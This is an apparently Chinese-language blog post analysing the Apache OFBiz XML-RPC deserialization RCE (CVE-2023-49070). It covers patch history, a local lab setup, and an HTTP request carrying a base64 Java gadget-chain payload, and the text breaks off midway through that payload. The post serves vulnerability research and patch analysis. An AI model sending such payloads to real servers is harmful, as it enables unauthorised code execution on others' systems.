<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CVE-2023-49070 Apache OFBiz XMLRPC RCE漏洞分析 | _0xf4n9x_'s Blog</title><meta name="author" content="_0xf4n9x_"><meta name="copyright" content="_0xf4n9x_"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="0x00 漏洞简介 0x01 影响版本 0x02 历史相关漏洞修复回顾 xmlrpc鉴权 serializable关键词检测 移除XML-RPC   0x03 漏洞环境搭建 0x04 漏洞分析 0x05 漏洞复现 0x06 修复建议  0x00 漏洞简介Apache OFBiz是一个开源的企业资源规划（ERP）系统，它提供了一套企业应用程序，可以集成和自动化企业的许多业务流程。 2023年12月">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2023-49070 Apache OFBiz XMLRPC RCE漏洞分析">
<meta property="og:url" content="https://0xf4n9x.github.io/apache-ofbiz-cve-2023-49070-xmlrpc-rce.html">
<meta property="og:site_name" content="_0xf4n9x_&#39;s Blog">
<meta property="og:description" content="0x00 漏洞简介 0x01 影响版本 0x02 历史相关漏洞修复回顾 xmlrpc鉴权 serializable关键词检测 移除XML-RPC   0x03 漏洞环境搭建 0x04 漏洞分析 0x05 漏洞复现 0x06 修复建议  0x00 漏洞简介Apache OFBiz是一个开源的企业资源规划（ERP）系统，它提供了一套企业应用程序，可以集成和自动化企业的许多业务流程。 2023年12月">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://0xf4n9x.github.io/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/burp.png">
<meta property="article:published_time" content="2023-12-07T01:52:59.000Z">
<meta property="article:modified_time" content="2023-12-07T01:52:59.000Z">
<meta property="article:author" content="_0xf4n9x_">
<meta property="article:tag" content="cve">
<meta property="article:tag" content="java">
<meta property="article:tag" content="rce">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://0xf4n9x.github.io/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/burp.png"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://0xf4n9x.github.io/apache-ofbiz-cve-2023-49070-xmlrpc-rce.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//static.cloudflareinsights.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-YRH7DCY1TL"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-YRH7DCY1TL');
</script><script defer="defer" data-pjax="data-pjax" src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon="{&quot;token&quot;: &quot;3f9a5286f0c84213b902626e6f7a5081&quot;}"></script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: false,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CVE-2023-49070 Apache OFBiz XMLRPC RCE漏洞分析',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-12-07 09:52:59'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 6 || hour >= 18
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="_0xf4n9x_'s Blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">24</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/burp.png')"><nav id="nav"><span id="blog-info"><a href="/" title="_0xf4n9x_'s Blog"><span class="site-name">_0xf4n9x_'s Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CVE-2023-49070 Apache OFBiz XMLRPC RCE漏洞分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-12-07T01:52:59.000Z" title="Created 2023-12-07 09:52:59">2023-12-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-12-07T01:52:59.000Z" title="Updated 2023-12-07 09:52:59">2023-12-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">3.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>15min</span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">Comments:</span><a href="/apache-ofbiz-cve-2023-49070-xmlrpc-rce.html#post-comment"><span class="gitalk-comment-count"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><ul>
<li><a href="#0x00-%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">0x00 漏洞简介</a></li>
<li><a href="#0x01-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC">0x01 影响版本</a></li>
<li><a href="#0x02-%E5%8E%86%E5%8F%B2%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E5%9B%9E%E9%A1%BE">0x02 历史相关漏洞修复回顾</a><ul>
<li><a href="#xmlrpc%E9%89%B4%E6%9D%83">xmlrpc鉴权</a></li>
<li><a href="#serializable%E5%85%B3%E9%94%AE%E8%AF%8D%E6%A3%80%E6%B5%8B">serializable关键词检测</a></li>
<li><a href="#%E7%A7%BB%E9%99%A4XML-RPC">移除XML-RPC</a></li>
</ul>
</li>
<li><a href="#0x03-%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">0x03 漏洞环境搭建</a></li>
<li><a href="#0x04-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">0x04 漏洞分析</a></li>
<li><a href="#0x05-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">0x05 漏洞复现</a></li>
<li><a href="#0x06-%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE">0x06 修复建议</a></li>
</ul>
<h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h2><p>Apache OFBiz是一个开源的企业资源规划（ERP）系统，它提供了一套企业应用程序，可以集成和自动化企业的许多业务流程。</p>
<p>2023年12月初，Apache官方发布OFBiz新版本18.12.10，以移除XML-RPC组件的方式修复编号为CVE-2023-49070的远程代码执行漏洞。本次漏洞源于OFBiz使用了存在反序列化漏洞的XML-RPC组件，这个脆弱组件问题在早期的CVE-2020-9496漏洞中已有所体现，虽然官方在CVE-2020-9496漏洞之后，增加了Filter拦截与权限校验，但攻击者能够绕过这些判断逻辑，达到CVE-2020-9496 RCE漏洞的再次利用。</p>
<h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><ul>
<li>&lt;18.12.10</li>
</ul>
<h2 id="0x02-历史相关漏洞修复回顾"><a href="#0x02-历史相关漏洞修复回顾" class="headerlink" title="0x02 历史相关漏洞修复回顾"></a>0x02 历史相关漏洞修复回顾</h2><h3 id="xmlrpc鉴权"><a href="#xmlrpc鉴权" class="headerlink" title="xmlrpc鉴权"></a>xmlrpc鉴权</h3><p>由于CVE-2023-49070是CVE-2020-9496漏洞的绕过再利用，那便从CVE-2020-9496漏洞的修复方式开始看起，这个漏洞的影响范围为<code>&lt;17.12.04</code>，是源于使用的XML-RPC组件的反序列化漏洞。</p>
<p>2020年5月19日，官方对该漏洞进行了修复，修复方式很简单直接，对xmlrpc的访问增加了鉴权，阻止对xmlrpc的未授权访问，如下Commit。</p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/apache/ofbiz-framework/commit/d708d9a#diff-bb54e344de72488b4e358a9d8fd385a5d9a6aea32d7236e7c268889f6ba3a8f6">https://github.com/apache/ofbiz-framework/commit/d708d9a#diff-bb54e344de72488b4e358a9d8fd385a5d9a6aea32d7236e7c268889f6ba3a8f6</a></p>
<p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/ofbiz-auth-true.png"></p>
<p>这种不彻底的修复方式，使得该漏洞在认证后依然能够被利用。</p>
<h3 id="serializable关键词检测"><a href="#serializable关键词检测" class="headerlink" title="serializable关键词检测"></a>serializable关键词检测</h3><p>果不其然，2021年10月3日，名为Jie Zhu的Reporter向OFBiz官方报告了这个由于CVE-2020-9496补丁修复不彻底的认证后漏洞，当时最新的版本17.12.08也是受影响的。</p>
<p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/OFBIZ-12332.png"></p>
<p>官方表示这个问题本质上与OFBiz无关，而是由于XMLRPC存在的反序列化漏洞而导致的，但XMLRPC也停止了维护，因此也只能在OFBiz中对这个问题进行修复，修复方式是在<code>ContextFilter</code>类中增加黑名单关键词进行检测。</p>
<p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/OFBIZ-12332-asf-comment.png"></p>
<p>最初的黑名单关键词是<code>&lt;/serializable&gt;</code>，只要检测到请求正文中包含该关键词就报内容未经授权，Commit如下。</p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/apache/ofbiz-framework/commit/15c209a#diff-f37b7643914fa9638206d2d8f2c04d507c024581dec14b2a2588b4a4c46cf96b">https://github.com/apache/ofbiz-framework/commit/15c209a#diff-f37b7643914fa9638206d2d8f2c04d507c024581dec14b2a2588b4a4c46cf96b</a></p>
<p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/contextfilter-serializable-fix1.png"></p>
<p>对于官方采用的这种黑名单修复方式，很显然是无法覆盖全面的，总会存在绕过的方式，Jie Zhu也很快发现了绕过方式，在原来被检测的关键词的中间增加一个空格便能轻松绕过。最终，官方对此便又将检测的关键词换成了<code>&lt;/serializable</code>。</p>
<p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/OFBIZ-12332-zhu-comment.png"></p>
<p>不过，原本是由<code>org.apache.ofbiz.webapp.control.ContextFilter</code>类进行检测，现在变成了由<code>org.apache.ofbiz.base.util.CacheFilter</code>类，Commit如下。</p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/apache/ofbiz-framework/commit/fb49563">https://github.com/apache/ofbiz-framework/commit/fb49563</a></p>
<p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/cachefilter-serializable-fix.png"></p>
<p>此处的判断逻辑在后续还发生了一些变化，最终的代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">    <span class="comment">// Get the request URI without the webapp mount point.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">context</span> <span class="operator">=</span> ((HttpServletRequest) request).getContextPath();</span><br><span class="line">    <span class="type">String</span> <span class="variable">uriWithContext</span> <span class="operator">=</span> ((HttpServletRequest) request).getRequestURI();</span><br><span class="line">    <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> uriWithContext.substring(context.length());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;/control/xmlrpc&quot;</span>.equals(uri.toLowerCase())) &#123;</span><br><span class="line">        <span class="comment">// Read request.getReader() as many time you need</span></span><br><span class="line">        request = <span class="keyword">new</span> <span class="title class_">RequestWrapper</span>((HttpServletRequest) request);</span><br><span class="line">        <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> request.getReader().lines().collect(Collectors.joining());</span><br><span class="line">        <span class="keyword">if</span> (body.contains(<span class="string">&quot;&lt;/serializable&quot;</span>)) &#123;</span><br><span class="line">            Debug.logError(<span class="string">&quot;Content not authorised for security reason&quot;</span>, <span class="string">&quot;CacheFilter&quot;</span>); <span class="comment">// Cf. OFBIZ-12332</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    chain.doFilter(request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="移除XML-RPC"><a href="#移除XML-RPC" class="headerlink" title="移除XML-RPC"></a>移除XML-RPC</h3><p>时间来到2023年4月26日，也就是本次CVE-2023-49070漏洞的出现，CVE-2023-49070漏洞是如上两种修复方式的绕过，这次官方对于该漏洞的修复方式非常彻底，直接将废弃的、无人维护的Apache XML-RPC进行了移除。</p>
<p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/OFBIZ-12812.png"></p>
<p>但他们只对18.12和22.01两个分支进行了Commit，这也就意味着17.12分支中的所有版本暂无补丁。针对18.12版本的Commit如下。</p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/apache/ofbiz-framework/commit/c59336f604">https://github.com/apache/ofbiz-framework/commit/c59336f604</a></p>
<p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/commit-c59336f604.png"></p>
<h2 id="0x03-漏洞环境搭建"><a href="#0x03-漏洞环境搭建" class="headerlink" title="0x03 漏洞环境搭建"></a>0x03 漏洞环境搭建</h2><p>下载18.12.09版本，搭建环境进行分析。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://archive.apache.org/dist/ofbiz/apache-ofbiz-18.12.09.zip</span><br><span class="line">unzip apache-ofbiz-18.12.09.zip &amp;&amp; <span class="built_in">cd</span> apache-ofbiz-18.12.09</span><br></pre></td></tr></table></figure>

<p>使用如下几条命令将OFBiz环境起起来。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sh gradle/init-gradle-wrapper.sh</span><br><span class="line">./gradlew cleanAll</span><br><span class="line">./gradlew <span class="string">&quot;ofbiz --load-data readers=seed,seed-initial,ext&quot;</span></span><br><span class="line">./gradlew ofbiz</span><br></pre></td></tr></table></figure>

<blockquote>
<p>搭建低版本（如17.12.04）的OFBiz，执行如上gradlew命令可能会报java.io.FileNotFoundException错误，此时需要修改<code>gradle/gradle-wrapper.properties</code>文件内容，将如下行替换至其中。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">distributionUrl=https\://services.gradle.org/distributions/gradle-5.0-rc-5-bin.zip</span><br></pre></td></tr></table></figure>
</blockquote>
<p>启动后访问<code>https://localhost:8443/myportal/control/main</code>登录页面，以确认环境是否搭建成功。</p>
<p>确认完毕后，先关闭OFBiz，通过如下命令再次启动。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gradlew ofbizDebug</span><br></pre></td></tr></table></figure>

<p>并在IDEA中新增如下Run&#x2F;Debug配置。</p>
<p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/ofbiz-idea-debug-conf.png"></p>
<p>这样便能对OFBiz进行调试了。</p>
<p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/ofbiz-debugging.png"></p>
<h2 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04 漏洞分析"></a>0x04 漏洞分析</h2><p>根据web.xml中的如下映射关系，可得知请求会先被<code>org.apache.ofbiz.base.util.CacheFilter</code>进行处理。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>CacheFilter<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CacheFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.ofbiz.base.util.CacheFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CacheFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>所以将断点打至<code>org.apache.ofbiz.base.util.CacheFilter#doFilter</code>方法，先发送CVE-2020-9496的Payload。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/webtools/control/xmlrpc</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8443</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/xml</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>3982</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span><span class="tag">&lt;<span class="name">methodName</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span><span class="tag">&lt;<span class="name">params</span>&gt;</span><span class="tag">&lt;<span class="name">param</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">struct</span>&gt;</span><span class="tag">&lt;<span class="name">member</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>rce<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">serializable</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;</span>&gt;</span>rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABqjK/rq+AAAAMgA5CgADACIHADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZX